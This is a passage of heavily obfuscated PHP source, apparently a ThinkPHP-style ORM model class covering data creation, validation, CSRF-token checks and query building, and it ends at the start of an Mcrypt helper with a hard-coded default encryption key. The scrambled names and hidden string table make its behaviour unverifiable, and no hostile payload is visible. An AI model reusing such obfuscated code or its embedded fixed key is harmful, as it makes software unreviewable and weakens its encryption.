count($C¢öÚŠ©­²); goto c¾ÉéÈìŒÜ; Ešƒ¹¬—: } } else { if (!0 !== $DÌá™ÄÙäÊ) { $FĞ“Œø­Â‰[$e³‚¿İê™Í[280]] = is_numeric($DÌá™ÄÙäÊ) ? $DÌá™ÄÙäÊ : 1; } if ($DÌá™ÄÙäÊ === $e³‚¿İê™Í[243]) { unset($FĞ“Œø­Â‰[$e³‚¿İê™Í[280]]); } $c—’‰®ŒÃò = $this->db->select($FĞ“Œø­Â‰); if (!empty($c—’‰®ŒÃò)) { if ($DÌá™ÄÙäÊ === $e³‚¿İê™Í[243]) { return reset($c—’‰®ŒÃò[0]); } if (!0 !== $DÌá™ÄÙäÊ && 1 == $FĞ“Œø­Â‰[$e³‚¿İê™Í[280]]) { return reset($c—’‰®ŒÃò[0]); } foreach ($c—’‰®ŒÃò as $CŒŸ£çŸ¾Æ) { $BäÜÆÛ³¬Ë[] = $CŒŸ£çŸ¾Æ[$aÈ»‚¬äİà]; } return $BäÜÆÛ³¬Ë; } } return null; } public function create($A›–„…‡Ë½ = '', $DŸšÜÖÖ = '') { goto c‰¢Ì¦¼©Á; c°—ÀÖô«: $A›–„…‡Ë½ = $this->parseFieldsMap($A›–„…‡Ë½, 0); $DŸšÜÖÖ = $DŸšÜÖÖ ? $DŸšÜÖÖ : (!empty($A›–„…‡Ë½[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$D÷æ™™Î‰ê[261]])) { $e‹‚îÛ©‰ = $this->options[$D÷æ™™Î‰ê[261]]; unset($this->options[$D÷æ™™Î‰ê[261]]); } elseif ($DŸšÜÖÖ == THINK_MODEL_INSERT && isset($this->insertFields)) { $e‹‚îÛ©‰ = $this->insertFields; } elseif ($DŸšÜÖÖ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $e‹‚îÛ©‰ = $this->updateFields; } goto DÓ±†Øˆ´¥; c‰¢Ì¦¼©Á: $D÷æ™™Î‰ê =& $_SERVER[îÖ]; if (empty($A›–„…‡Ë½)) { $A›–„…‡Ë½ = $_POST; } elseif (is_object($A›–„…‡Ë½)) { $A›–„…‡Ë½ = get_object_vars($A›–„…‡Ë½); } if (empty($A›–„…‡Ë½) || !is_array($A›–„…‡Ë½)) { $this->error = think_lang($D÷æ™™Î‰ê[259]); return !1; } goto c°—ÀÖô«; DÓ±†Øˆ´¥: if (isset($e‹‚îÛ©‰)) { if (is_string($e‹‚îÛ©‰)) { $e‹‚îÛ©‰ = explode($D÷æ™™Î‰ê[47], $e‹‚îÛ©‰); } if (think_config($D÷æ™™Î‰ê[286])) { $e‹‚îÛ©‰[] = think_config($D÷æ™™Î‰ê[287]); } foreach ($A›–„…‡Ë½ as $B¦µöøÖâ => $F²³íæì¥) { if (!in_array($B¦µöøÖâ, $e‹‚îÛ©‰)) { unset($A›–„…‡Ë½[$B¦µöøÖâ]); } } } if (!$this->autoValidation($A›–„…‡Ë½, $DŸšÜÖÖ)) { return !1; } if (!$this->autoCheckToken($A›–„…‡Ë½)) { $this->error = think_lang($D÷æ™™Î‰ê[288]); return !1; } goto Dù±Ÿ­œ­¿; Bõéî³ØôŠ: return $A›–„…‡Ë½; goto F™ÄÙ¨ö£¾; Dù±Ÿ­œ­¿: if ($this->autoCheckFields) { $e‹‚îÛ©‰ = $this->getDbFields(); foreach ($A›–„…‡Ë½ as $B¦µöøÖâ => $F²³íæì¥) { if (!in_array($B¦µöøÖâ, $e‹‚îÛ©‰)) { unset($A›–„…‡Ë½[$B¦µöøÖâ]); } elseif (MAGIC_QUOTES_GPC && is_string($F²³íæì¥)) { $A›–„…‡Ë½[$B¦µöøÖâ] = stripslashes($F²³íæì¥); } } } $this->autoOperation($A›–„…‡Ë½, $DŸšÜÖÖ); $this->data = $A›–„…‡Ë½; goto Bõéî³ØôŠ; F™ÄÙ¨ö£¾: } public function autoCheckToken($cëëôîõÉ×) { $C²ëéİ¢áí =& $_SERVER[îÖ]; if (isset($this->options[$C²ëéİ¢áí[289]]) && !$this->options[$C²ëéİ¢áí[289]]) { return !0; } if (think_config($C²ëéİ¢áí[286])) { $D”äâ¡´Ò = think_config($C²ëéİ¢áí[287]); if (!isset($cëëôîõÉ×[$D”äâ¡´Ò]) || Session::get($D”äâ¡´Ò)) { return !1; } list($f³ÑİÏµ¤, $fĞñÓ©Â±) = explode($C²ëéİ¢áí[70], $cëëôîõÉ×[$D”äâ¡´Ò]); if ($fĞñÓ©Â± && Session::get($D”äâ¡´Ò . $C²ëéİ¢áí[91] . $f³ÑİÏµ¤) === $fĞñÓ©Â±) { Session::remove($D”äâ¡´Ò . $C²ëéİ¢áí[91] . $f³ÑİÏµ¤); return !0; } if (think_config($C²ëéİ¢áí[290])) { Session::remove($D”äâ¡´Ò . $C²ëéİ¢áí[91] . $f³ÑİÏµ¤); } return !1; } return !0; } public function regex($a¡Ï«ø…‰, $B Íè­­îÓ) { $BÖ÷åÕˆÈô =& $_SERVER[îÖ]; $aË˜‚š—ª† = array($BÖ÷åÕˆÈô[291] => $BÖ÷åÕˆÈô[292], $BÖ÷åÕˆÈô[293] => $BÖ÷åÕˆÈô[294], $BÖ÷åÕˆÈô[295] => $BÖ÷åÕˆÈô[296], $BÖ÷åÕˆÈô[297] => $BÖ÷åÕˆÈô[298], $BÖ÷åÕˆÈô[299] => $BÖ÷åÕˆÈô[300], $BÖ÷åÕˆÈô[301] => $BÖ÷åÕˆÈô[302], $BÖ÷åÕˆÈô[303] => $BÖ÷åÕˆÈô[304], $BÖ÷åÕˆÈô[278] => $BÖ÷åÕˆÈô[305], $BÖ÷åÕˆÈô[306] => $BÖ÷åÕˆÈô[307]); if (isset($aË˜‚š—ª†[strtolower($B Íè­­îÓ)])) { $B Íè­­îÓ = $aË˜‚š—ª†[strtolower($B Íè­­îÓ)]; } return preg_match($B Íè­­îÓ, $a¡Ï«ø…‰) === 1; } private function autoOperation(&$E¶Ôù¿Õ²§, $cõ¾Ùöãï©) { $BĞÑ•î¾×Ü =& $_SERVER[îÖ]; if (!empty($this->options[$BĞÑ•î¾×Ü[308]])) { $B¾Ë°Ş›àŒ = $this->options[$BĞÑ•î¾×Ü[308]]; unset($this->options[$BĞÑ•î¾×Ü[308]]); } elseif (!empty($this->_auto)) { $B¾Ë°Ş›àŒ = $this->_auto; } if (isset($B¾Ë°Ş›àŒ)) { foreach ($B¾Ë°Ş›àŒ as $CâÑù™ÄÅ) { if (empty($CâÑù™ÄÅ[2])) { $CâÑù™ÄÅ[2] = THINK_MODEL_INSERT; } if ($cõ¾Ùöãï© == $CâÑù™ÄÅ[2] || $CâÑù™ÄÅ[2] == THINK_MODEL_BOTH) { switch (trim($CâÑù™ÄÅ[3])) { case $BĞÑ•î¾×Ü[309]: case $BĞÑ•î¾×Ü[310]: $a¶Î¥ù·… = isset($CâÑù™ÄÅ[4]) ? (array) $CâÑù™ÄÅ[4] : array(); if (isset($E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]])) { array_unshift($a¶Î¥ù·…, $E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]]); } if ($BĞÑ•î¾×Ü[309] == $CâÑù™ÄÅ[3]) { $E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]] = call_user_func_array($CâÑù™ÄÅ[1], $a¶Î¥ù·…); } else { $E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]] = call_user_func_array(array(&$this, $CâÑù™ÄÅ[1]), $a¶Î¥ù·…); } break; case $BĞÑ•î¾×Ü[261]: $E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]] = $E¶Ôù¿Õ²§[$CâÑù™ÄÅ[1]]; break; case $BĞÑ•î¾×Ü[311]: if ($BĞÑ•î¾×Ü[33] === $E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]]) { unset($E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]]); } break; case $BĞÑ•î¾×Ü[312]: default: $E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]] = $CâÑù™ÄÅ[1]; } if (!1 === $E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]]) { unset($E¶Ôù¿Õ²§[$CâÑù™ÄÅ[0]]); } } } } return $E¶Ôù¿Õ²§; } protected function autoValidation($D´ïÜÚ‘Ë, $c¤í³œ«Š¹) { $dòÁ•™õ =& $_SERVER[îÖ]; if (!empty($this->options[$dòÁ•™õ[313]])) { $Bã¯Ë‘ùä = $this->options[$dòÁ•™õ[313]]; unset($this->options[$dòÁ•™õ[313]]); } elseif (!empty($this->_validate)) { $Bã¯Ë‘ùä = $this->_validate; } if (isset($Bã¯Ë‘ùä)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Bã¯Ë‘ùä as $d“²•òÁë¯ => $FŠÜšíÏŸ) { if (empty($FŠÜšíÏŸ[5]) || $FŠÜšíÏŸ[5] == THINK_MODEL_BOTH || $FŠÜšíÏŸ[5] == $c¤í³œ«Š¹) { if (0 == strpos($FŠÜšíÏŸ[2], $dòÁ•™õ[314]) && strpos($FŠÜšíÏŸ[2], $dòÁ•™õ[315])) { $FŠÜšíÏŸ[2] = think_lang(substr($FŠÜšíÏŸ[2], 2, -1)); } $FŠÜšíÏŸ[3] = isset($FŠÜšíÏŸ[3]) ? $FŠÜšíÏŸ[3] : THINK_EXISTS_VALIDATE; $FŠÜšíÏŸ[4] = isset($FŠÜšíÏŸ[4]) ? $FŠÜšíÏŸ[4] : $dòÁ•™õ[316]; switch ($FŠÜšíÏŸ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($D´ïÜÚ‘Ë, $FŠÜšíÏŸ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($dòÁ•™õ[33] != trim($D´ïÜÚ‘Ë[$FŠÜšíÏŸ[0]])) { if (!1 === $this->_validationField($D´ïÜÚ‘Ë, $FŠÜšíÏŸ)) { return !1; } } break; default: if (isset($D´ïÜÚ‘Ë[$FŠÜšíÏŸ[0]])) { if (!1 === $this->_validationField($D´ïÜÚ‘Ë, $FŠÜšíÏŸ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($A‘¹Ïî¿©Ï, $aÅ÷ÈèÒŒÄ) { if (!1 === $this->_validationFieldItem($A‘¹Ïî¿©Ï, $aÅ÷ÈèÒŒÄ)) { if ($this->patchValidate) { $this->error[$aÅ÷ÈèÒŒÄ[0]] = $aÅ÷ÈèÒŒÄ[2]; } else { $this->error = $aÅ÷ÈèÒŒÄ[2]; return !1; } } return; } protected function _validationFieldItem($f–¾…ºº³, $cñ’¥ˆ³¬”) { $F­Ìë„Î =& $_SERVER[îÖ]; switch (strtolower(trim($cñ’¥ˆ³¬”[4]))) { case $F­Ìë„Î[309]: case $F­Ìë„Î[310]: $d¯÷æáÔ…à = isset($cñ’¥ˆ³¬”[6]) ? (array) $cñ’¥ˆ³¬”[6] : array(); if (is_string($cñ’¥ˆ³¬”[0]) && strpos($cñ’¥ˆ³¬”[0], $F­Ìë„Î[47])) { $cñ’¥ˆ³¬”[0] = explode($F­Ìë„Î[47], $cñ’¥ˆ³¬”[0]); } if (is_array($cñ’¥ˆ³¬”[0])) { foreach ($cñ’¥ˆ³¬”[0] as $BÒãé“—Á‘) { $eÁ›¨§ğ®Î[$BÒãé“—Á‘] = $f–¾…ºº³[$BÒãé“—Á‘]; } array_unshift($d¯÷æáÔ…à, $eÁ›¨§ğ®Î); } else { array_unshift($d¯÷æáÔ…à, $f–¾…ºº³[$cñ’¥ˆ³¬”[0]]); } if ($F­Ìë„Î[309] == $cñ’¥ˆ³¬”[4]) { return call_user_func_array($cñ’¥ˆ³¬”[1], $d¯÷æáÔ…à); } else { return call_user_func_array(array(&$this, $cñ’¥ˆ³¬”[1]), $d¯÷æáÔ…à); } case $F­Ìë„Î[317]: return $f–¾…ºº³[$cñ’¥ˆ³¬”[0]] == $f–¾…ºº³[$cñ’¥ˆ³¬”[1]]; case $F­Ìë„Î[318]: if (is_string($cñ’¥ˆ³¬”[0]) && strpos($cñ’¥ˆ³¬”[0], $F­Ìë„Î[47])) { $cñ’¥ˆ³¬”[0] = explode($F­Ìë„Î[47], $cñ’¥ˆ³¬”[0]); } $AÚ¿´ˆ¤õµ = array(); if (is_array($cñ’¥ˆ³¬”[0])) { foreach ($cñ’¥ˆ³¬”[0] as $BÒãé“—Á‘) { $AÚ¿´ˆ¤õµ[$BÒãé“—Á‘] = $f–¾…ºº³[$BÒãé“—Á‘]; } } else { $AÚ¿´ˆ¤õµ[$cñ’¥ˆ³¬”[0]] = $f–¾…ºº³[$cñ’¥ˆ³¬”[0]]; } if (!empty($f–¾…ºº³[$this->getPk()])) { $AÚ¿´ˆ¤õµ[$this->getPk()] = array($F­Ìë„Î[319], $f–¾…ºº³[$this->getPk()]); } if ($this->where($AÚ¿´ˆ¤õµ)->find()) { return !1; } return !0; default: return $this->check($f–¾…ºº³[$cñ’¥ˆ³¬”[0]], $cñ’¥ˆ³¬”[1], $cñ’¥ˆ³¬”[4]); } } public function check($B†ùï¥ìªØ, $E¦çÂÏ„İ³, $Dâ“„ÜÛ í = "\162\145\x67\x65\170") { $F¿ê¿åÀÓ¹ =& $_SERVER[îÖ]; $Dâ“„ÜÛ í = strtolower(trim($Dâ“„ÜÛ í)); switch ($Dâ“„ÜÛ í) { case $F¿ê¿åÀÓ¹[7]: case $F¿ê¿åÀÓ¹[320]: $C»¸±ö‡ãİ = is_array($E¦çÂÏ„İ³) ? $E¦çÂÏ„İ³ : explode($F¿ê¿åÀÓ¹[47], $E¦çÂÏ„İ³); return $Dâ“„ÜÛ í == $F¿ê¿åÀÓ¹[7] ? in_array($B†ùï¥ìªØ, $C»¸±ö‡ãİ) : !in_array($B†ùï¥ìªØ, $C»¸±ö‡ãİ); case $F¿ê¿åÀÓ¹[321]: case $F¿ê¿åÀÓ¹[322]: if (is_array($E¦çÂÏ„İ³)) { $D’‚‚¦Ÿ‘ˆ = $E¦çÂÏ„İ³[0]; $c‡®Ñ‡êÇ° = $E¦çÂÏ„İ³[1]; } else { list($D’‚‚¦Ÿ‘ˆ, $c‡®Ñ‡êÇ°) = explode($F¿ê¿åÀÓ¹[47], $E¦çÂÏ„İ³); } return $Dâ“„ÜÛ í == $F¿ê¿åÀÓ¹[321] ? $B†ùï¥ìªØ >= $D’‚‚¦Ÿ‘ˆ && $B†ùï¥ìªØ <= $c‡®Ñ‡êÇ° : $B†ùï¥ìªØ < $D’‚‚¦Ÿ‘ˆ || $B†ùï¥ìªØ > $c‡®Ñ‡êÇ°; case $F¿ê¿åÀÓ¹[323]: case $F¿ê¿åÀÓ¹[324]: return $Dâ“„ÜÛ í == $F¿ê¿åÀÓ¹[323] ? $B†ùï¥ìªØ == $E¦çÂÏ„İ³ : $B†ùï¥ìªØ != $E¦çÂÏ„İ³; case $F¿ê¿åÀÓ¹[325]: $B´• –’Í = mb_strlen($B†ùï¥ìªØ, $F¿ê¿åÀÓ¹[326]); if (strpos($E¦çÂÏ„İ³, $F¿ê¿åÀÓ¹[47])) { list($D’‚‚¦Ÿ‘ˆ, $c‡®Ñ‡êÇ°) = explode($F¿ê¿åÀÓ¹[47], $E¦çÂÏ„İ³); return $B´• –’Í >= $D’‚‚¦Ÿ‘ˆ && $B´• –’Í <= $c‡®Ñ‡êÇ°; } else { return $B´• –’Í == $E¦çÂÏ„İ³; } case $F¿ê¿åÀÓ¹[327]: list($e­‡ÑÛÌßí, $b Î‹°æÖ) = explode($F¿ê¿åÀÓ¹[47], $E¦çÂÏ„İ³); if (!is_numeric($e­‡ÑÛÌßí)) { $e­‡ÑÛÌßí = strtotime($e­‡ÑÛÌßí); } if (!is_numeric($b Î‹°æÖ)) { $b Î‹°æÖ = strtotime($b Î‹°æÖ); } return NOW_TIME >= $e­‡ÑÛÌßí && NOW_TIME <= $b Î‹°æÖ; case $F¿ê¿åÀÓ¹[328]: return in_array(get_client_ip(), explode($F¿ê¿åÀÓ¹[47], $E¦çÂÏ„İ³)); case $F¿ê¿åÀÓ¹[329]: return !in_array(get_client_ip(), explode($F¿ê¿åÀÓ¹[47], $E¦çÂÏ„İ³)); case $F¿ê¿åÀÓ¹[316]: default: return $this->regex($B†ùï¥ìªØ, $E¦çÂÏ„İ³); } } public function query($d××ºÉô“–, $FŠ†öÓß• = false) { $DÜ „‰±À÷ =& $_SERVER[îÖ]; if (!is_bool($FŠ†öÓß•) && !is_array($FŠ†öÓß•)) { $FŠ†öÓß• = func_get_args(); array_shift($FŠ†öÓß•); } $d××ºÉô“– = str_replace(array($DÜ „‰±À÷[217], $DÜ „‰±À÷[330]), $DÜ „‰±À÷[50], $d××ºÉô“–); $d××ºÉô“– = $this->parseSql($d××ºÉô“–, $FŠ†öÓß•); return $this->db->query($d××ºÉô“–); } public function execute($f…ª¢çóˆÁ, $C…“ÌŞ‡›« = false) { if (!is_bool($C…“ÌŞ‡›«) && !is_array($C…“ÌŞ‡›«)) { $C…“ÌŞ‡›« = func_get_args(); array_shift($C…“ÌŞ‡›«); } $f…ª¢çóˆÁ = $this->parseSql($f…ª¢çóˆÁ, $C…“ÌŞ‡›«); return $this->db->execute($f…ª¢çóˆÁ); } protected function parseSql($Dí¼˜æ‘Ä¬, $Aßë„½ãî) { $AëìáëÈµ =& $_SERVER[îÖ]; if (!0 === $Aßë„½ãî) { $FğÏïã°ó¢ = $this->_parseOptions(); $Dí¼˜æ‘Ä¬ = $this->db->parseSql($Dí¼˜æ‘Ä¬, $FğÏïã°ó¢); } elseif (is_array($Aßë„½ãî)) { $Aßë„½ãî = array_map(array($this->db, $AëìáëÈµ[331]), $Aßë„½ãî); $Dí¼˜æ‘Ä¬ = vsprintf($Dí¼˜æ‘Ä¬, $Aßë„½ãî); } else { $Dí¼˜æ‘Ä¬ = strtr($Dí¼˜æ‘Ä¬, array($AëìáëÈµ[332] => $this->getTableName(), $AëìáëÈµ[333] => think_config($AëìáëÈµ[232]))); } $this->db->setModel($this->name); return $Dí¼˜æ‘Ä¬; } public function db($F£®’µãŒ = '', $CâØ’Œ§å¦ = '', $fÌ³Ó’¦ß¢ = array()) { goto B˜ÏŒ‘²Æ; eŸÈÓ„èÜÁ: $eÄ†Ï¥íµà[$F£®’µãŒ] = $CâØ’Œ§å¦; $this->db = $Dè§æ§Î³µ[$F£®’µãŒ]; $this->_after_db(); goto B°È«ä¦ó; B°È«ä¦ó: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f‘ô«“Îñ; B˜ÏŒ‘²Æ: $e®è†°”ë¥ =& $_SERVER[îÖ]; if ($e®è†°”ë¥[33] === $F£®’µãŒ && $this->db) { return $this->db; } static $eÄ†Ï¥íµà = array(); goto Aƒ¡«ÁÌ›Ñ; Aƒ¡«ÁÌ›Ñ: static $Dè§æ§Î³µ = array(); if (!isset($Dè§æ§Î³µ[$F£®’µãŒ]) || isset($Dè§æ§Î³µ[$F£®’µãŒ]) && $CâØ’Œ§å¦ && $eÄ†Ï¥íµà[$F£®’µãŒ] != $CâØ’Œ§å¦) { if (!empty($CâØ’Œ§å¦) && is_string($CâØ’Œ§å¦) && !1 === strpos($CâØ’Œ§å¦, $e®è†°”ë¥[8])) { $CâØ’Œ§å¦ = think_config($CâØ’Œ§å¦); } $Dè§æ§Î³µ[$F£®’µãŒ] = Db::getInstance($CâØ’Œ§å¦); } elseif (NULL === $CâØ’Œ§å¦) { $Dè§æ§Î³µ[$F£®’µãŒ]->close(); unset($Dè§æ§Î³µ[$F£®’µãŒ]); return; } if (!empty($fÌ³Ó’¦ß¢)) { if (is_string($fÌ³Ó’¦ß¢)) { parse_str($fÌ³Ó’¦ß¢, $fÌ³Ó’¦ß¢); } foreach ($fÌ³Ó’¦ß¢ as $d¶‘øÜ’ò› => $D‹ò¶°ëò) { $this->setProperty($d¶‘øÜ’ò›, $D‹ò¶°ëò); } } goto eŸÈÓ„èÜÁ; f‘ô«“Îñ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $d‹¡‘˜ = get_class($this); if ($d‹¡‘˜ == $_SERVER[îÖ][334]) { return $this->name; } $this->name = substr($d‹¡‘˜, 0, -5); } return $this->name; } public function getTableName() { $Aä‰ÉÆø¼· =& $_SERVER[îÖ]; if (empty($this->trueTableName)) { $c†‘‚òÁ‘ = !empty($this->tablePrefix) ? $this->tablePrefix : $Aä‰ÉÆø¼·[33]; if (!empty($this->tableName)) { $c†‘‚òÁ‘ .= $this->tableName; } else { $c†‘‚òÁ‘ .= think_parse_name($this->name); } $this->trueTableName = strtolower($c†‘‚òÁ‘); } return (!empty($this->dbName) ? $this->dbName . $Aä‰ÉÆø¼·[91] : $Aä‰ÉÆø¼·[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $fƒ™¡¥Åæ— =& $_SERVER[îÖ]; return isset($this->fields[$fƒ™¡¥Åæ—[239]]) ? $this->fields[$fƒ™¡¥Åæ—[239]] : $this->pk; } public function getDbFields() { $AÛßê‚ÈÒ =& $_SERVER[îÖ]; if (isset($this->options[$AÛßê‚ÈÒ[267]])) { $c›²¾äÆì° = $this->db->getFields($this->options[$AÛßê‚ÈÒ[267]]); return $c›²¾äÆì° ? array_keys($c›²¾äÆì°) : !1; } if ($this->fields) { $c›²¾äÆì° = $this->fields; unset($c›²¾äÆì°[$AÛßê‚ÈÒ[238]], $c›²¾äÆì°[$AÛßê‚ÈÒ[239]], $c›²¾äÆì°[$AÛßê‚ÈÒ[240]], $c›²¾äÆì°[$AÛßê‚ÈÒ[237]]); return $c›²¾äÆì°; } return !1; } public function data($a×Ä½éÛõ× = '') { $CŞ‰õ„ÙÈ­ =& $_SERVER[îÖ]; if ($CŞ‰õ„ÙÈ­[33] === $a×Ä½éÛõ× && !empty($this->data)) { return $this->data; } if (is_object($a×Ä½éÛõ×)) { $a×Ä½éÛõ× = get_object_vars($a×Ä½éÛõ×); } elseif (is_string($a×Ä½éÛõ×)) { parse_str($a×Ä½éÛõ×, $a×Ä½éÛõ×); } elseif (!is_array($a×Ä½éÛõ×)) { think_exception(think_lang($CŞ‰õ„ÙÈ­[259])); } $this->data = $a×Ä½éÛõ×; return $this; } public function join($EïªÆ»—ƒ) { $c“ãÇäÛ†¼ =& $_SERVER[îÖ]; if (is_array($EïªÆ»—ƒ)) { $this->options[$c“ãÇäÛ†¼[270]] = $EïªÆ»—ƒ; } elseif (!empty($EïªÆ»—ƒ)) { $this->options[$c“ãÇäÛ†¼[270]][] = $EïªÆ»—ƒ; } return $this; } public function union($cèŠéÇÕ‰¶, $c©š¾£÷¥ = false) { goto C  Œ°Ü”Ü; C  Œ°Ü”Ü: $c›ë¯‡Ş‚æ =& $_SERVER[îÖ]; if (empty($cèŠéÇÕ‰¶)) { return $this; } if ($c©š¾£÷¥) { $this->options[$c›ë¯‡Ş‚æ[335]][$c›ë¯‡Ş‚æ[336]] = !0; } goto aâ¶×è½Ú³; aâ¶×è½Ú³: if (is_object($cèŠéÇÕ‰¶)) { $cèŠéÇÕ‰¶ = get_object_vars($cèŠéÇÕ‰¶); } if (is_string($cèŠéÇÕ‰¶)) { $dÉ™§ğô†œ = $cèŠéÇÕ‰¶; } elseif (is_array($cèŠéÇÕ‰¶)) { if (isset($cèŠéÇÕ‰¶[0])) { $this->options[$c›ë¯‡Ş‚æ[335]] = array_merge($this->options[$c›ë¯‡Ş‚æ[335]], $cèŠéÇÕ‰¶); return $this; } else { $dÉ™§ğô†œ = $cèŠéÇÕ‰¶; } } else { think_exception(think_lang($c›ë¯‡Ş‚æ[259])); } $this->options[$c›ë¯‡Ş‚æ[335]][] = $dÉ™§ğô†œ; goto Aß–ôµâ§ó; Aß–ôµâ§ó: return $this; goto Aùâƒ¹ãŸ‘; Aùâƒ¹ãŸ‘: } public function cache($e®ÊÆÄà† = true, $B˜¸Æ¥‚ùÅ = null, $eÄõÃŠ‹àÎ = '') { $C¬´×ìÌ =& $_SERVER[îÖ]; if (!1 !== $e®ÊÆÄà†) { $this->options[$C¬´×ìÌ[337]] = array($C¬´×ìÌ[89] => $e®ÊÆÄà†, $C¬´×ìÌ[327] => $B˜¸Æ¥‚ùÅ, $C¬´×ìÌ[29] => $eÄõÃŠ‹àÎ); } return $this; } public function field($aµ¯³¨ÇÑ, $EÜ›‹À¢Ñ = false) { $Eíğ«èóîœ =& $_SERVER[îÖ]; if (!0 === $aµ¯³¨ÇÑ) { $c¤Â¿§«Û = $this->getDbFields(); $aµ¯³¨ÇÑ = $c¤Â¿§«Û ? $c¤Â¿§«Û : $Eíğ«èóîœ[176]; } elseif ($EÜ›‹À¢Ñ) { if (is_string($aµ¯³¨ÇÑ)) { $aµ¯³¨ÇÑ = explode($Eíğ«èóîœ[47], $aµ¯³¨ÇÑ); } $c¤Â¿§«Û = $this->getDbFields(); $aµ¯³¨ÇÑ = $c¤Â¿§«Û ? array_diff($c¤Â¿§«Û, $aµ¯³¨ÇÑ) : $aµ¯³¨ÇÑ; } $this->options[$Eíğ«èóîœ[261]] = $aµ¯³¨ÇÑ; return $this; } public function scope($f‘îå‡Ë = '', $BØ¬£–ä¼ = NULL) { $AßÕÅàÁœë =& $_SERVER[îÖ]; if ($AßÕÅàÁœë[33] === $f‘îå‡Ë) { if (isset($this->_scope[$AßÕÅàÁœë[34]])) { $fÔô‹›Ë°° = $this->_scope[$AßÕÅàÁœë[34]]; } else { return $this; } } elseif (is_string($f‘îå‡Ë)) { $Dí÷Ô­îôâ = explode($AßÕÅàÁœë[47], $f‘îå‡Ë); $fÔô‹›Ë°° = array(); foreach ($Dí÷Ô­îôâ as $DäŒ¯õ„¾) { if (!isset($this->_scope[$DäŒ¯õ„¾])) { continue; } $fÔô‹›Ë°° = array_merge($fÔô‹›Ë°°, $this->_scope[$DäŒ¯õ„¾]); } if (!empty($BØ¬£–ä¼) && is_array($BØ¬£–ä¼)) { $fÔô‹›Ë°° = array_merge($fÔô‹›Ë°°, $BØ¬£–ä¼); } } elseif (is_array($f‘îå‡Ë)) { $fÔô‹›Ë°° = $f‘îå‡Ë; } if (is_array($fÔô‹›Ë°°) && !empty($fÔô‹›Ë°°)) { $this->options = array_merge($this->options, array_change_key_case($fÔô‹›Ë°°)); } return $this; } public function where($c‘Ñ—òËÖ¦, $EùÊ«¥ ™– = null) { $bø »ÎÃ¿ =& $_SERVER[îÖ]; if (!is_null($EùÊ«¥ ™–) && is_string($c‘Ñ—òËÖ¦)) { if (!is_array($EùÊ«¥ ™–)) { $EùÊ«¥ ™– = func_get_args(); array_shift($EùÊ«¥ ™–); } $EùÊ«¥ ™– = array_map(array($this->db, $bø »ÎÃ¿[331]), $EùÊ«¥ ™–); $c‘Ñ—òËÖ¦ = vsprintf($c‘Ñ—òËÖ¦, $EùÊ«¥ ™–); } elseif (is_object($c‘Ñ—òËÖ¦)) { $c‘Ñ—òËÖ¦ = get_object_vars($c‘Ñ—òËÖ¦); } elseif (is_array($c‘Ñ—òËÖ¦)) { foreach ($c‘Ñ—òËÖ¦ as $bÙ¡±§ëŸ => $D”î‘Ì×­) { if ((is_numeric($bÙ¡±§ëŸ) || !$bÙ¡±§ëŸ) && is_string($D”î‘Ì×­)) { think_trace($bø »ÎÃ¿[338], $bø »ÎÃ¿[33], $bø »ÎÃ¿[46]); die; } } } if (is_string($c‘Ñ—òËÖ¦) && $bø »ÎÃ¿[33] != $c‘Ñ—òËÖ¦) { $däŸ½ëê°‹ = array(); $däŸ½ëê°‹[$bø »ÎÃ¿[339]] = $c‘Ñ—òËÖ¦; $c‘Ñ—òËÖ¦ = $däŸ½ëê°‹; } if (isset($this->options[$bø »ÎÃ¿[263]])) { $this->options[$bø »ÎÃ¿[263]] = array_merge($this->options[$bø »ÎÃ¿[263]], $c‘Ñ—òËÖ¦); } else { $this->options[$bø »ÎÃ¿[263]] = $c‘Ñ—òËÖ¦; } return $this; } public function limit($Fƒ•·Œµ…Ü, $c©¦ò‚“°³ = null) { $C¢µ…‰‰š =& $_SERVER[îÖ]; $this->options[$C¢µ…‰‰š[280]] = is_null($c©¦ò‚“°³) ? $Fƒ•·Œµ…Ü : $Fƒ•·Œµ…Ü . $C¢µ…‰‰š[47] . $c©¦ò‚“°³; return $this; } public function page($c‘œÚš¡‹à, $f×ŒßÖ‚ = null) { $A¡½’¢œ» =& $_SERVER[îÖ]; $this->options[$A¡½’¢œ»[340]] = is_null($f×ŒßÖ‚) ? $c‘œÚš¡‹à : $c‘œÚš¡‹à . $A¡½’¢œ»[47] . $f×ŒßÖ‚; return $this; } public function comment($FŒ½Úµ¹) { $this->options[$_SERVER[îÖ][341]] = $FŒ½Úµ¹; return $this; } public function setProperty($bœ´ƒè¨¦, $B…Õ°ƒ¦¿) { if (property_exists($this, $bœ´ƒè¨¦)) { $this->{$bœ´ƒè¨¦} = $B…Õ°ƒ¦¿; } return $this; } } goto F½é±¼‘²; e¨íŸÕôÛ: define($_SERVER[îÖ][227], 2); define($_SERVER[îÖ][228], 3); define($_SERVER[îÖ][229], 1); goto BôÛƒïµ§Á; bÉ¿çƒä : class Mcrypt { public static $defaultKey = "\141\41\x74\141\153\x41\72\144\x6c\x6d\143\154\x64\105\x76\x2c\x65"; public static function encode($aÒ¾æÊ•¤­, $eó¸ÜÜªÕÇ = '', $f¿´¤Ù† = 0, $BÑ–™²è¾‚ = '') { goto eº’”ïÄ¬ô; F¤¼Ô¥“·í: $B¼Úë¢Î¯ = 